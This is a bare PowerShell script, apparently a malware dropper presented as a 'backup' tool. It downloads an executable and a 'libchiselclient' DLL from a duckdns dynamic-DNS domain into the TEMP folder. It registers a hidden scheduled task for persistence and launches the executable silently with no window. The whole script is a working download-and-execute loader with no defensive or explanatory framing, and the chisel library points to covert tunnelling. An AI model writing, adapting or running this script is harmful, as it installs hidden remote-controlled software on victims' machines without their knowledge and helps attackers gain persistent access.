$taskName = "BackupRustTask"

$tempDir = $env:TEMP
$exeFileName = "backup-rs.exe"

$downloadUrl = "https://verefy.duckdns.org/backup-rs.exe"
Invoke-WebRequest -Uri "https://verefy.duckdns.org/libchiselclient.dll" -OutFile "$tempDir\libchiselclient.dll"

$exePath  = Join-Path -Path $tempDir -ChildPath $exeFileName
$workDir  = $tempDir

Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing -ErrorAction Stop

try {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction Stop
} catch {
}

$action = New-ScheduledTaskAction -Execute $exePath -WorkingDirectory $workDir
$trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddYears(10))
$settings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -MultipleInstances IgnoreNew

Register-ScheduledTask `
    -TaskName $taskName `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -Description "Hidden background launch of backup-rs.exe" `
    -Force | Out-Null

$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $exePath
$psi.WorkingDirectory = $workDir
$psi.UseShellExecute = $false
$psi.CreateNoWindow = $true
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden

$proc = New-Object System.Diagnostics.Process
$proc.StartInfo = $psi
$null = $proc.Start()